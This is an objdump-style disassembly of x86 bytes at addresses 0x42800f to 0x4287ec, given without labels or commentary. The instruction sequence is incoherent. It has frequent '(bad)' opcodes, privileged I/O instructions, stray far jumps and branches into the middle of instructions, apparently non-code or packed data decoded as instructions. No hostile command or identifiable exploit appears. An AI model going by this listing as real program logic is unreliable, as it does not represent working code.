  42800f:	mov    al,BYTE PTR [ebx+0x306b1ba0]
  428015:	sub    ebx,DWORD PTR [edi]
  428017:	ins    DWORD PTR es:[edi],dx
  428018:	pop    ds
  428019:	xchg   BYTE PTR [ebp+0x7d],bl
  42801c:	or     BYTE PTR ds:0x15a6a4b8,dl
  428022:	jb     0x427fd8
  428024:	test   DWORD PTR [esi+0x4abc6fcb],ebx
  42802a:	iret   
  42802b:	sub    eax,0xbf508fe7
  428030:	mov    edi,0x5874b07c
  428035:	sti    
  428036:	out    0xdc,eax
  428038:	jbe    0x42805e
  42803a:	out    0xd4,al
  42803c:	sbb    ah,bl
  42803e:	repz pop ds
  428040:	cmp    esi,ebx
  428042:	sbb    ebp,DWORD PTR [ecx]
  428044:	jp     0x427fd9
  428046:	xchg   esi,eax
  428047:	test   DWORD PTR [edx-0x4ec0d1db],ecx
  42804d:	xor    BYTE PTR [ecx+0xb9c0e80],0xf2
  428054:	inc    ecx
  428055:	pop    es
  428056:	or     al,0xb7
  428058:	sbb    DWORD PTR [edi*2+0x7d7acaf4],edi
  42805f:	call   0x9d00:0xb07109c3
  428066:	ret    
  428067:	mov    cl,BYTE PTR [eax-0x28]
  42806a:	loop   0x427ff3
  42806c:	sub    ah,BYTE PTR [esi-0x46b0b445]
  428072:	add    BYTE PTR [esi],ah
  428074:	pop    ecx
  428075:	push   eax
  428076:	push   0x60
  428078:	cmp    bl,BYTE PTR [ecx]
  42807a:	(bad)  
  42807c:	stos   BYTE PTR es:[edi],al
  42807d:	mov    esi,0x4aa39d3e
  428082:	jbe    0x42807f
  428084:	xchg   DWORD PTR [esi+0x4c0ad7bb],ebx
  42808a:	retf   0x7e76
  42808d:	sti    
  42808e:	push   edx
  42808f:	js     0x42809d
  428091:	cmp    cl,bl
  428093:	hlt    
  428094:	push   esp
  428095:	xchg   ebp,eax
  428096:	xor    al,0xf4
  428098:	fwait
  428099:	and    eax,0xb219f2fe
  42809e:	sub    edi,DWORD PTR [eax+0x4a]
  4280a1:	adc    DWORD PTR [esi],0x4d
  4280a4:	push   eax
  4280a5:	push   esi
  4280a6:	add    dh,BYTE PTR [edi]
  4280a8:	popf   
  4280a9:	mov    ah,0xb9
  4280ab:	dec    esp
  4280ac:	stc    
  4280ad:	es xchg esi,eax
  4280af:	rcr    DWORD PTR ds:0x66acb527,0x8
  4280b6:	pop    eax
  4280b7:	xor    eax,0x2594d931
  4280bc:	pop    edi
  4280bd:	fild   QWORD PTR [esi]
  4280bf:	out    dx,eax
  4280c0:	aaa    
  4280c1:	xchg   ebx,eax
  4280c2:	pop    esp
  4280c3:	mov    BYTE PTR [ebx],ch
  4280c5:	rcr    DWORD PTR [edi-0x4107c88f],1
  4280cb:	out    0x24,al
  4280cd:	and    BYTE PTR [eax-0x47b0ffb8],ch
  4280d3:	push   esp
  4280d4:	jo     0x4280df
  4280d6:	test   al,0xc
  4280d8:	xchg   BYTE PTR [edx-0x1f],dh
  4280db:	adc    ch,BYTE PTR [ebx]
  4280dd:	push   0xd252b79
  4280e2:	mov    bh,0xd8
  4280e4:	add    eax,0x4c841f59
  4280e9:	js     0x42809e
  4280eb:	inc    esp
  4280ec:	xor    dh,ch
  4280ee:	or     eax,0x50a6359f
  4280f3:	jmp    0x744abaf0
  4280f8:	pop    ss
  4280f9:	jns    0x4280f0
  4280fb:	in     al,dx
  4280fc:	das    
  4280fd:	ins    BYTE PTR es:[edi],dx
  4280fe:	add    al,0x41
  428100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428102:	retf   
  428103:	xor    eax,0xa2178b
  428108:	pushf  
  428109:	fisttp WORD PTR [ebx+0x7e]
  42810c:	rcr    DWORD PTR ds:0xa315f4b3,1
  428112:	push   ss
  428113:	dec    edx
  428114:	cmp    DWORD PTR [eax+0x337fc26e],esi
  42811a:	xor    DWORD PTR [eax],eax
  42811c:	and    eax,0x1f0a000
  428121:	pop    ss
  428122:	jg     0x428114
  428124:	enter  0x4479,0x6c
  428128:	push   esi
  428129:	mov    ds:0xafc7a3eb,al
  42812e:	mov    ecx,0x8d03a50f
  428133:	in     al,dx
  428134:	jno    0x428149
  428136:	sub    bl,BYTE PTR [edx+0x1b]
  428139:	cmp    edi,ebx
  42813b:	retf   0xc8b8
  42813e:	enter  0x2a4d,0xa8
  428142:	cmp    edx,DWORD PTR [esi-0x3]
  428145:	(bad)  
  428146:	aas    
  428147:	hlt    
  428148:	mov    cl,0x39
  42814a:	dec    ecx
  42814b:	adc    al,0x96
  42814d:	fnstsw WORD PTR [esi-0x1ca7b45c]
  428153:	jmp    0x4173:0x8943a809
  42815a:	adc    edi,DWORD PTR [ebp+0x1c]
  42815d:	imul   edi,esi,0x50d5980f
  428163:	sub    eax,0x699ba245
  428168:	xchg   esp,eax
  428169:	sub    esi,0xffffffd1
  42816c:	inc    ebp
  42816d:	daa    
  42816e:	dec    ecx
  42816f:	shl    BYTE PTR [ebx+edx*4+0xc4914b4],cl
  428176:	scas   eax,DWORD PTR es:[edi]
  428177:	xor    esi,DWORD PTR ds:0xcfe75b91
  42817d:	stc    
  42817e:	push   esp
  42817f:	mov    DWORD PTR [esi],ebx
  428181:	test   eax,0x5d32fc83
  428186:	mov    cl,0x87
  428188:	push   es
  428189:	or     cl,ah
  42818b:	sbb    DWORD PTR ds:0x5ab40d2b,edx
  428191:	cmc    
  428192:	push   cs
  428193:	jecxz  0x428126
  428195:	or     eax,0x9d00f3f4
  42819a:	xchg   edi,eax
  42819b:	pop    esi
  42819c:	or     eax,0x59e9e839
  4281a1:	loopne 0x428167
  4281a3:	je     0x42818c
  4281a5:	push   edx
  4281a6:	pop    esp
  4281a7:	fcom   DWORD PTR [ebx-0x70]
  4281aa:	xor    al,0x33
  4281ac:	aam    0xce
  4281ae:	sub    ch,al
  4281b0:	add    dh,BYTE PTR [edx]
  4281b2:	jl     0x4281aa
  4281b4:	and    DWORD PTR [ebx+ecx*1],ebp
  4281b7:	lock add eax,0xcb04bf01
  4281bd:	jbe    0x4281f7
  4281bf:	aaa    
  4281c0:	fadd   DWORD PTR [ebp-0x36]
  4281c3:	iret   
  4281c4:	aad    0xf1
  4281c6:	leave  
  4281c7:	call   0x7eb0ab9a
  4281cc:	(bad)  
  4281cd:	lahf   
  4281ce:	mov    ah,0xf4
  4281d0:	inc    ebp
  4281d1:	fmul   DWORD PTR [ebx+0x3]
  4281d4:	in     eax,0x78
  4281d6:	test   cl,ch
  4281d8:	mov    dh,0xe4
  4281da:	mov    bh,0x43
  4281dc:	jge    0x428245
  4281de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281df:	shl    DWORD PTR [edi-0x6f],cl
  4281e2:	(bad)  
  4281e3:	(bad)  
  4281e4:	and    eax,0x9b352bb0
  4281e9:	jo     0x4281a0
  4281eb:	popa   
  4281ec:	jne    0x42820a
  4281ee:	jno    0x4281db
  4281f0:	aas    
  4281f1:	out    0x5e,al
  4281f3:	pop    edx
  4281f4:	push   ss
  4281f5:	fsincos 
  4281f7:	mov    BYTE PTR [esi+0xa397740],0x9a
  4281fe:	dec    ebx
  4281ff:	(bad)  
  428200:	push   edi
  428201:	xor    DWORD PTR [edi],eax
  428203:	jno    0x42822e
  428205:	xor    DWORD PTR [ecx-0x4a8b3150],eax
  42820b:	in     al,0xad
  42820d:	adc    eax,0x9acd9f04
  428212:	fwait
  428213:	jp     0x428279
  428215:	mov    eax,0xb39e3bbe
  42821a:	adc    al,0xd5
  42821c:	jp     0x4281fa
  42821e:	mov    edi,0x6d88ff84
  428223:	sub    al,0x45
  428225:	adc    BYTE PTR ds:0xec602ee9,bl
  42822b:	and    esp,DWORD PTR [ecx+ecx*2]
  42822e:	repnz daa 
  428230:	sbb    DWORD PTR [edi+edx*8],edx
  428233:	icebp  
  428234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428236:	sbb    eax,eax
  428238:	loop   0x42820f
  42823a:	mov    ch,0x3e
  42823c:	test   BYTE PTR [ecx],0xa5
  42823f:	dec    ebx
  428240:	sbb    ecx,edi
  428242:	mov    esi,0x388db95f
  428247:	xor    al,0x82
  428249:	enter  0x25ac,0x68
  42824d:	retf   0x9f3b
  428250:	xor    DWORD PTR [ebx+0x45],eax
  428253:	push   ecx
  428254:	mov    dl,0xa4
  428256:	into   
  428257:	cld    
  428258:	pop    ecx
  428259:	or     ebx,ebp
  42825b:	and    dh,BYTE PTR [esi]
  42825d:	fwait
  42825e:	or     al,0xde
  428260:	or     ebx,DWORD PTR [edi]
  428262:	mov    ebp,0xed4197ec
  428267:	les    edx,FWORD PTR [ebp+0x46a7b649]
  42826d:	out    dx,al
  42826e:	xchg   esi,eax
  42826f:	add    al,0xa5
  428271:	add    al,0xbf
  428273:	out    dx,al
  428274:	or     eax,0x52a84702
  428279:	rol    edi,1
  42827b:	and    al,0x76
  42827d:	shl    BYTE PTR [eax],1
  42827f:	sar    ebx,0x66
  428282:	mov    ebp,0x3f9a66f3
  428287:	and    bh,dh
  428289:	pop    esp
  42828a:	enter  0xa7c0,0x9c
  42828e:	mov    bl,0x66
  428290:	gs out 0x73,al
  428293:	out    0x9c,al
  428295:	repnz fxam 
  428298:	push   ebp
  428299:	add    BYTE PTR [ebp+0x7cf71beb],0x35
  4282a0:	push   ds
  4282a1:	leave  
  4282a2:	cld    
  4282a3:	aam    0x9f
  4282a5:	aad    0x14
  4282a7:	fidiv  WORD PTR [edi-0x67]
  4282aa:	mov    edi,DWORD PTR [ebx+edx*8-0x7e]
  4282ae:	ret    
  4282af:	and    esp,DWORD PTR [edi+0x71]
  4282b2:	iret   
  4282b3:	sub    bl,BYTE PTR [ecx+ebp*8+0xd]
  4282b7:	sbb    al,0xc4
  4282b9:	nop
  4282ba:	mov    ah,0xe5
  4282bc:	aas    
  4282bd:	xor    BYTE PTR [esp+ebp*4-0xdcf404b],0x48
  4282c5:	shr    DWORD PTR [ebp+0x7f],cl
  4282c8:	push   ds
  4282c9:	mov    DWORD PTR [ecx+0x15],edx
  4282cc:	mov    al,ds:0x474345da
  4282d1:	mov    al,ds:0x9240f92b
  4282d6:	mov    WORD PTR [eax+0x23],cs
  4282d9:	jae    0x428326
  4282db:	out    dx,eax
  4282dc:	jbe    0x428298
  4282de:	mov    esi,0x3f919c84
  4282e3:	ja     0x42834a
  4282e5:	jl     0x428294
  4282e7:	in     al,dx
  4282e8:	cmp    DWORD PTR [eax+0x47],0xffffffe0
  4282ec:	(bad)  
  4282ee:	mov    dl,0x5e
  4282f0:	xchg   ebp,eax
  4282f1:	ja     0x4282dd
  4282f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282f4:	outs   dx,BYTE PTR ds:[esi]
  4282f5:	sbb    DWORD PTR [ebp-0x45a363c],edi
  4282fb:	mov    ecx,0x9dca48ac
  428300:	jmp    0xb327:0x712174f5
  428307:	fs jge 0x4282f5
  42830a:	fcomp  DWORD PTR [ecx+0x1f1e2da6]
  428310:	fs out dx,eax
  428312:	lods   eax,DWORD PTR ds:[esi]
  428313:	scas   al,BYTE PTR es:[edi]
  428314:	pop    ds
  428315:	dec    ecx
  428316:	fiadd  WORD PTR cs:[ebx]
  428319:	sbb    ecx,DWORD PTR [eax-0x614312d6]
  42831f:	xchg   esi,eax
  428320:	mov    al,0x41
  428322:	mov    dh,0x28
  428324:	mov    dl,0xa4
  428326:	or     ebx,DWORD PTR [esi-0x5e]
  428329:	jp     0x428316
  42832b:	add    BYTE PTR [eax-0x57da196],dl
  428331:	inc    esp
  428332:	mov    edi,0xfda94c44
  428337:	pop    ds
  428338:	mov    eax,0xf9528773
  42833d:	cli    
  42833e:	jnp    0x428313
  428340:	es mov ah,0xa8
  428343:	popa   
  428344:	xchg   ebp,eax
  428345:	xchg   esp,eax
  428346:	and    ch,al
  428348:	push   ss
  428349:	jmp    0x376b6a7a
  42834e:	xchg   edx,eax
  42834f:	test   al,0x5a
  428351:	call   0xf594:0xbce9a17b
  428358:	or     al,0x1c
  42835a:	push   es
  42835b:	jae    0x4283cd
  42835d:	sar    ebp,0x55
  428360:	mov    dh,0xe7
  428362:	adc    DWORD PTR [edx],0x26
  428365:	clc    
  428366:	inc    ebx
  428367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428368:	sbb    bl,cl
  42836a:	push   0x9e523d4
  42836f:	loopne 0x428316
  428371:	sbb    BYTE PTR [ebx],0xeb
  428374:	push   ebp
  428375:	add    ah,BYTE PTR ds:0x22ca8f8c
  42837b:	jmp    FWORD PTR [eax-0xa353687]
  428381:	je     0x4283fa
  428383:	out    dx,al
  428384:	pop    esp
  428385:	cdq    
  428386:	stos   DWORD PTR es:[edi],eax
  428387:	mov    al,ds:0x3e5fdf22
  42838c:	dec    ebp
  42838d:	pop    esi
  42838e:	mov    WORD PTR [ecx+0x14b3e6a5],cs
  428394:	inc    ecx
  428395:	sub    dh,dh
  428397:	jle    0x428396
  428399:	cdq    
  42839a:	imul   esp,DWORD PTR [edx+edi*8],0x6c
  42839e:	or     al,0xda
  4283a0:	mov    bl,0x87
  4283a2:	push   eax
  4283a3:	inc    ebp
  4283a4:	inc    edx
  4283a5:	stc    
  4283a6:	mov    dh,0x44
  4283a8:	cmp    al,0x43
  4283aa:	js     0x428359
  4283ac:	cmc    
  4283ad:	sbb    DWORD PTR [edx+0x7beae4ea],0xd5c92427
  4283b7:	push   es
  4283b8:	jno    0x42838d
  4283ba:	sbb    eax,esi
  4283bc:	inc    esi
  4283bd:	mov    ds:0x77a68fcb,al
  4283c2:	xchg   ebx,eax
  4283c3:	into   
  4283c4:	test   DWORD PTR [eax+eiz*4],edx
  4283c7:	sub    eax,0x14b288c1
  4283cc:	xchg   DWORD PTR [edi-0x2e9fc14],edi
  4283d2:	fwait
  4283d3:	push   ss
  4283d4:	mov    eax,0xdddc4e99
  4283d9:	shr    BYTE PTR [edi+0x54],0xc6
  4283dd:	xor    BYTE PTR [ebx+0x5426b024],0x97
  4283e4:	xchg   DWORD PTR [ebx+0x7676df15],ebx
  4283ea:	pop    edx
  4283eb:	sbb    al,0x23
  4283ed:	push   esi
  4283ee:	jb     0x4283c9
  4283f0:	sbb    DWORD PTR [ecx-0x74],ecx
  4283f3:	mov    cl,0xb2
  4283f5:	icebp  
  4283f6:	add    eax,0xbd43e31
  4283fb:	add    al,0xf
  4283fd:	mov    BYTE PTR [ebx+0x2b],bl
  428400:	popf   
  428401:	test   al,0xf5
  428403:	or     DWORD PTR [edi],ebx
  428405:	jns    0x4283da
  428407:	test   eax,0x8934fdaa
  42840c:	call   0xe33c9fb8
  428411:	push   ds
  428412:	test   al,0xaa
  428414:	mov    bh,0x74
  428416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428417:	and    al,0x32
  428419:	mov    esi,0x3d9785e1
  42841e:	mov    edi,0x6e651ae4
  428423:	jnp    0x4283d5
  428425:	sahf   
  428426:	sub    esi,ecx
  428428:	mov    dl,0x7f
  42842a:	xor    eax,0xaff92380
  42842f:	push   ebp
  428430:	je     0x4283d4
  428432:	mov    cl,0xce
  428434:	fldenv [edx]
  428436:	loope  0x4283c8
  428438:	xchg   esi,eax
  428439:	std    
  42843a:	in     al,0x15
  42843c:	lahf   
  42843d:	xchg   ecx,eax
  42843e:	mov    ecx,0x9491bdf4
  428443:	aad    0xbd
  428445:	dec    edx
  428446:	(bad)  
  428447:	in     al,0xcd
  428449:	test   eax,0xc34ed0eb
  42844e:	cmp    DWORD PTR [edi+eax*1],esi
  428451:	or     bl,BYTE PTR [edx]
  428453:	and    al,0x16
  428455:	jmp    0x99da:0xa6b90196
  42845c:	es test eax,0xd1a22fa
  428462:	arpl   WORD PTR ds:0x33ab06a1,bp
  428468:	jo     0x428407
  42846a:	pop    ebx
  42846b:	hlt    
  42846c:	jb     0x4283fc
  42846e:	shl    DWORD PTR [ebp+0x3fe7a576],1
  428474:	fmul   st(6),st
  428476:	loopne 0x42843c
  428478:	fbstp  TBYTE PTR [esp+esi*2]
  42847b:	daa    
  42847c:	and    al,0x7f
  42847e:	push   edi
  42847f:	inc    ecx
  428480:	xor    eax,0x31eaddbc
  428485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428486:	dec    edx
  428487:	in     al,dx
  428488:	sbb    eax,0xa0a1b8a9
  42848d:	mov    ch,0x89
  42848f:	adc    BYTE PTR [ecx-0x5f],ch
  428492:	pop    ebx
  428493:	gs dec eax
  428495:	scas   eax,DWORD PTR es:[edi]
  428496:	cmc    
  428497:	or     esp,ebp
  428499:	inc    edi
  42849a:	shl    DWORD PTR [edi+edx*8+0x4723f0ee],cl
  4284a1:	push   ebp
  4284a2:	jnp    0x428462
  4284a4:	test   BYTE PTR [edi-0x5bf14344],dl
  4284aa:	dec    esp
  4284ab:	xor    DWORD PTR [di+0x307b],ebx
  4284b0:	push   ecx
  4284b1:	out    0x1d,al
  4284b3:	mov    esi,DWORD PTR [esi]
  4284b5:	xchg   esi,eax
  4284b6:	fnsave [esi+ebx*1-0x5e]
  4284ba:	pop    es
  4284bb:	inc    edx
  4284bc:	lahf   
  4284bd:	inc    esi
  4284be:	pop    edx
  4284bf:	stos   DWORD PTR es:[edi],eax
  4284c0:	sbb    al,0x99
  4284c2:	dec    esi
  4284c3:	inc    eax
  4284c4:	aas    
  4284c5:	cmp    dh,BYTE PTR [ebx]
  4284c7:	sub    BYTE PTR [ebp-0x7503c460],ah
  4284cd:	out    0x4a,al
  4284cf:	ds push edi
  4284d1:	xor    DWORD PTR [ecx],0x49
  4284d4:	cmp    DWORD PTR [esi+esi*4],eax
  4284d7:	and    al,0xb0
  4284d9:	aad    0xcb
  4284db:	loope  0x428482
  4284dd:	mov    dl,0xc6
  4284df:	in     al,dx
  4284e0:	adc    ch,BYTE PTR [edi*4+0x2f899192]
  4284e7:	scas   eax,DWORD PTR es:[edi]
  4284e8:	stos   DWORD PTR es:[edi],eax
  4284e9:	jecxz  0x4284d6
  4284eb:	add    eax,0xb4b647c2
  4284f0:	jne    0x42854d
  4284f2:	xor    eax,0xf7c107f1
  4284f7:	ficomp DWORD PTR [edi-0x17]
  4284fa:	and    DWORD PTR [edi],esp
  4284fc:	inc    esp
  4284fd:	not    DWORD PTR [eax+0x35]
  428500:	fwait
  428501:	mov    ch,0xc2
  428503:	ds mov ch,0x46
  428506:	fucomp st(3)
  428508:	xor    ah,BYTE PTR [esi+0x7d]
  42850b:	push   cs
  42850c:	dec    esp
  42850d:	pop    ecx
  42850e:	imul   ebp,eax,0xffffffda
  428511:	mov    WORD PTR [ecx],ds
  428513:	retf   0x9ad3
  428516:	cwde   
  428517:	and    ecx,DWORD PTR [eax+0x23]
  42851a:	daa    
  42851b:	mov    ah,0x79
  42851d:	jmp    0xa4b6:0xbc33890c
  428524:	and    eax,0x21d7186f
  428529:	or     DWORD PTR [edi],edi
  42852b:	xor    eax,ecx
  42852d:	adc    eax,0xa4ad6fe9
  428532:	pop    edx
  428533:	jbe    0x4284ba
  428535:	dec    edx
  428536:	jle    0x42851d
  428538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428539:	adc    DWORD PTR [ebx],eax
  42853b:	dec    eax
  42853c:	sbb    eax,0x52bb1859
  428541:	pop    edi
  428542:	stos   DWORD PTR es:[edi],eax
  428543:	lock out 0x8b,al
  428546:	cld    
  428547:	and    ecx,DWORD PTR [ecx]
  428549:	xor    al,0xdd
  42854b:	or     DWORD PTR [edx-0x12],edx
  42854e:	retf   0x3202
  428551:	fisub  WORD PTR [edi+0x3]
  428554:	mov    WORD PTR [ecx-0x7],ds
  428557:	lds    esp,FWORD PTR [edx]
  428559:	pop    esp
  42855a:	fcomp  DWORD PTR [esi+0x38b9cc9c]
  428560:	push   ebp
  428561:	hlt    
  428562:	test   cl,ch
  428564:	mov    ds:0x209c6b32,eax
  428569:	mov    ecx,0x5fc47979
  42856e:	and    DWORD PTR [edx+eax*8-0x37],edi
  428572:	stos   DWORD PTR es:[edi],eax
  428573:	sbb    edi,DWORD PTR [ebp-0x5b28cb9b]
  428579:	and    edi,DWORD PTR ss:0x51472b00
  428580:	and    edx,DWORD PTR [ecx-0x11]
  428583:	pop    esi
  428584:	imul   ebp,DWORD PTR [eax+0x1a68dc66],0xfffffff4
  42858b:	inc    esi
  42858c:	mov    ch,0x9d
  42858e:	(bad)
  428593:	jp     0x428534
  428595:	dec    ebx
  428596:	mov    esp,0x65f3c844
  42859b:	sbb    DWORD PTR [eax-0x1912d460],esi
  4285a1:	inc    edi
  4285a2:	mov    cl,0x0
  4285a4:	xchg   edi,eax
  4285a5:	ret    0x8d86
  4285a8:	nop
  4285a9:	inc    esi
  4285aa:	mov    edx,0xe16e16e4
  4285af:	bound  eax,QWORD PTR [esi]
  4285b1:	data16 not dl
  4285b4:	mov    DWORD PTR [ebp-0x3c],ecx
  4285b7:	mov    DWORD PTR [edx-0x4a178c0a],ebx
  4285bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285be:	ja     0x42855b
  4285c0:	dec    esi
  4285c1:	stc    
  4285c2:	jmp    0x57a9a8b
  4285c7:	mov    dl,0xc5
  4285c9:	(bad)  
  4285ca:	loopne 0x42863e
  4285cc:	cli    
  4285cd:	pushf  
  4285ce:	push   ss
  4285cf:	retf   
  4285d0:	xchg   esi,eax
  4285d1:	enter  0xc3a1,0xd1
  4285d5:	sti    
  4285d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285d7:	push   ebp
  4285d8:	push   ecx
  4285d9:	leave  
  4285da:	xor    al,0xcd
  4285dc:	nop
  4285dd:	sub    BYTE PTR [ebp+0x2c0bacc8],dh
  4285e3:	pop    ecx
  4285e4:	push   cs
  4285e5:	ror    BYTE PTR [ebp-0x4c],0x9e
  4285e9:	mov    esi,0x7f4b1e89
  4285ee:	mov    al,0x11
  4285f0:	jae    0x4285ee
  4285f2:	mov    bh,0x64
  4285f4:	and    dh,dl
  4285f6:	leave  
  4285f7:	repnz aad 0x87
  4285fa:	or     eax,0xd6c0ede5
  4285ff:	mov    eax,ds:0xe20a9ae8
  428604:	test   BYTE PTR [ebp-0x5ddad186],0x57
  42860b:	in     al,dx
  42860c:	mov    DWORD PTR [edi+0x7b],eax
  42860f:	sbb    DWORD PTR [ebp-0x2f09dc98],esp
  428615:	xor    DWORD PTR ds:0x1b109433,esi
  42861b:	mov    cl,0x31
  42861d:	mov    al,0x8c
  42861f:	jbe    0x4285b2
  428621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428622:	arpl   WORD PTR [ecx],cx
  428624:	xor    bh,BYTE PTR [ebp+0x365540dd]
  42862a:	arpl   si,sp
  42862c:	(bad)  
  42862e:	inc    edx
  42862f:	adc    DWORD PTR [edi],0xffffff89
  428632:	mov    ah,BYTE PTR [ebp-0xed9eb49]
  428638:	jbe    0x4285cb
  42863a:	dec    edi
  42863b:	dec    ebp
  42863c:	(bad)  
  42863d:	mov    ch,0x5c
  42863f:	popa   
  428640:	jge    0x4285de
  428642:	mov    bl,0xb4
  428644:	add    eax,0xd074e49e
  428649:	ja     0x428600
  42864b:	add    al,0xc
  42864d:	(bad)  
  42864e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42864f:	jmp    0x68fe2058
  428654:	sub    eax,0xa45e7799
  428659:	sub    eax,0xc5fb4215
  42865e:	mov    bh,0xa4
  428660:	and    ah,dl
  428662:	dec    eax
  428663:	cdq    
  428664:	gs cdq 
  428666:	cmp    esi,DWORD PTR [eax+esi*2]
  428669:	outs   dx,DWORD PTR ds:[esi]
  42866a:	hlt    
  42866b:	jno    0x428671
  42866d:	xor    ebp,DWORD PTR [esi]
  42866f:	out    0xba,eax
  428671:	xor    al,0xb7
  428673:	add    al,0x87
  428675:	jg     0x4286da
  428677:	cs and eax,0xabf24ef8
  42867d:	dec    ebp
  42867e:	in     al,0x3c
  428680:	push   ebx
  428681:	cdq    
  428682:	mov    ds:0x6d287cab,eax
  428687:	ror    BYTE PTR [edi+0x49],cl
  42868a:	test   al,0xe7
  42868c:	aad    0x60
  42868e:	pop    esp
  42868f:	jmp    0x1c50fa93
  428694:	ins    DWORD PTR es:[edi],dx
  428695:	and    BYTE PTR [ebx+eiz*2-0x6b4932f9],bh
  42869c:	mov    fs,WORD PTR [esi]
  42869e:	pop    ss
  42869f:	and    eax,DWORD PTR [edi+0x41af80cf]
  4286a5:	hlt    
  4286a6:	jge    0x428693
  4286a8:	dec    ebp
  4286a9:	repnz and al,0x3
  4286ac:	aas    
  4286ad:	test   al,0x9a
  4286af:	mov    dh,0x86
  4286b1:	xchg   esi,eax
  4286b2:	mov    bl,0x14
  4286b4:	ja     0x42865c
  4286b6:	fwait
  4286b7:	xor    eax,0x18eaf55c
  4286bc:	repz popf 
  4286be:	bound  esi,QWORD PTR [ecx-0x2b1121ac]
  4286c4:	imul   esp,DWORD PTR [ecx],0xa17f7e74
  4286ca:	imul   ecx,eax,0xffffffe5
  4286cd:	jle    0x4286ec
  4286cf:	xchg   ebx,eax
  4286d0:	ins    DWORD PTR es:[edi],dx
  4286d1:	and    edx,ebx
  4286d3:	mov    edi,0x356e0f0a
  4286d8:	adc    eax,0xf5efadb3
  4286dd:	call   0x60a8:0x61c0be6b
  4286e4:	call   0x63a3:0xa6ce5c1
  4286eb:	call   0x5a2c9e39
  4286f0:	inc    ebx
  4286f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286f2:	sti    
  4286f3:	(bad)
  4286f6:	and    BYTE PTR ds:0xae17de60,0xbc
  4286fd:	or     ecx,edi
  4286ff:	test   BYTE PTR [ebx+0x19],ah
  428702:	fcom   QWORD PTR [ebx+0x6c]
  428705:	xchg   edi,eax
  428706:	(bad)  
  428707:	and    cl,bl
  428709:	mov    al,ds:0x492f46bb
  42870e:	jl     0x4286a6
  428710:	es xchg ecx,eax
  428712:	xchg   ebp,eax
  428713:	mov    DWORD PTR [edi-0x25],edi
  428716:	mov    ebx,0x592fbb34
  42871b:	outs   dx,DWORD PTR ds:[esi]
  42871c:	add    al,0xa9
  42871e:	mov    ecx,DWORD PTR [esi-0x1f574912]
  428724:	pushf  
  428725:	in     eax,dx
  428726:	or     esp,DWORD PTR [eax+0x7d]
  428729:	adc    esp,edi
  42872b:	les    eax,FWORD PTR [edi]
  42872d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42872e:	xchg   edi,eax
  42872f:	sbb    eax,0xb558a00f
  428734:	jae    0x4287a9
  428736:	mov    al,0xb4
  428738:	ss xor eax,0xc6f6cbef
  42873e:	lods   al,BYTE PTR ds:[esi]
  42873f:	xchg   DWORD PTR [esi-0x28],eax
  428742:	imul   ebx,ebx,0xffffffbf
  428745:	inc    edi
  428746:	xor    al,0x6b
  428748:	and    eax,0x62103e4e
  42874d:	scas   eax,DWORD PTR es:[edi]
  42874e:	mov    ebx,0x116231b4
  428753:	pop    eax
  428754:	jne    0x428765
  428756:	outs   dx,BYTE PTR ds:[esi]
  428757:	in     al,dx
  428758:	jae    0x428784
  42875a:	add    BYTE PTR fs:[ecx+ebp*2],ah
  42875e:	jne    0x42878d
  428760:	outs   dx,DWORD PTR ds:[esi]
  428761:	cmp    eax,0x9392acb5
  428766:	outs   dx,BYTE PTR ds:[esi]
  428767:	scas   al,BYTE PTR es:[edi]
  428768:	and    al,BYTE PTR [esi-0x635c63a7]
  42876e:	xchg   ebx,eax
  42876f:	pop    eax
  428770:	xchg   ebx,eax
  428771:	add    eax,0x5b1f46c4
  428776:	fnstsw WORD PTR [edi+0x4a04970b]
  42877c:	sbb    ebx,ebp
  42877e:	stc    
  42877f:	test   esp,0x2b852be6
  428785:	pop    esp
  428786:	mov    esi,0xf672fb64
  42878b:	adc    BYTE PTR [ebp+0xf],dl
  42878e:	sbb    cl,dh
  428790:	dec    esi
  428791:	into   
  428792:	das    
  428793:	and    BYTE PTR [ecx],ah
  428795:	or     DWORD PTR [ebx+eax*1-0x39],edi
  428799:	data16 loopne 0x42874b
  42879c:	xchg   esi,eax
  42879d:	fwait
  42879e:	cmp    ebx,DWORD PTR [ebx]
  4287a0:	or     DWORD PTR [ebx],edx
  4287a2:	stos   BYTE PTR es:[edi],al
  4287a3:	mov    ah,0xdb
  4287a5:	push   ds
  4287a6:	xchg   edi,eax
  4287a7:	adc    ecx,ebp
  4287a9:	mov    ebp,0x7c6c4b5
  4287ae:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287b0:	adc    eax,0xccf46497
  4287b5:	xor    edi,DWORD PTR [edi+0xff94040]
  4287bb:	pop    edx
  4287bc:	outs   dx,DWORD PTR ds:[esi]
  4287bd:	retf   
  4287be:	and    ch,BYTE PTR [esi+0x5b]
  4287c1:	sti    
  4287c2:	(bad)
  4287c5:	(bad)  
  4287c6:	push   esp
  4287c7:	in     al,dx
  4287c8:	mov    cl,0xc0
  4287ca:	dec    ebx
  4287cb:	cmc    
  4287cc:	ja     0x42876a
  4287ce:	cmp    edi,DWORD PTR [edx-0x57cb73ca]
  4287d4:	push   edi
  4287d5:	dec    edx
  4287d6:	or     al,0x6d
  4287d8:	push   eax
  4287d9:	push   ebx
  4287da:	push   0xffffff85
  4287dc:	dec    eax
  4287dd:	imul   esi,DWORD PTR [edi+0xe4da1b4],0x39
  4287e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287e5:	add    esi,ebp
  4287e7:	xchg   esp,eax
  4287e8:	push   cs
  4287e9:	(bad)  
  4287ea:	rcl    ebx,1
  4287ec:	mov    ebx,0xd7735825
